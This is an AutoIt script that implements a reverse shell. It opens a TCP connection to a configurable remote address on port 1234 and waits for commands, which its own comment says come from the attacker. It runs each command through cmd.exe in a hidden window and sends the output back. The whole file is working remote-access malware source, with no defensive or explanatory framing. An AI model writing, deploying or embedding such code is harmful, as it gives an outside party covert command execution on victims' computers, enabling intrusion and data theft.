#include <Array.au3>

Global $IPAddress = ""
Global $Port = 1234

Func RunShell()
    TCPStartup()
    Local $socket = TCPConnect($IPAddress, $Port)
    
    If @error Then
        MsgBox(16, "Error", "Failed to connect to " & $IPAddress & ":" & $Port)
        Exit
    EndIf
    
    Local $terminate = False
    
    While Not $terminate
        Local $recv = TCPRecv($socket, 1024)
        If @error Or $recv = "" Then ContinueLoop
        
        ; Split the command received from attacker
        Local $commands = StringSplit($recv, @CRLF)
        
        For $i = 1 To $commands[0]
            If $commands[$i] = "terminate_shell" Then
                $terminate = True
                ExitLoop
            EndIf
            
            Local $output = ExecuteCommand($commands[$i])
            TCPSend($socket, $output & @CRLF)
        Next
    WEnd
    
    TCPCloseSocket($socket)
    TCPShutdown()
EndFunc

Func ExecuteCommand($cmd)
    Local $stream = Run(@ComSpec & " /c " & $cmd, @SystemDir, @SW_HIDE, $STDERR_CHILD + $STDOUT_CHILD)
    Local $output = ""
    
    While 1
        $line = StdoutRead($stream)
        If @error Then ExitLoop
        $output &= $line
    WEnd
    
    Return $output
EndFunc

RunShell()
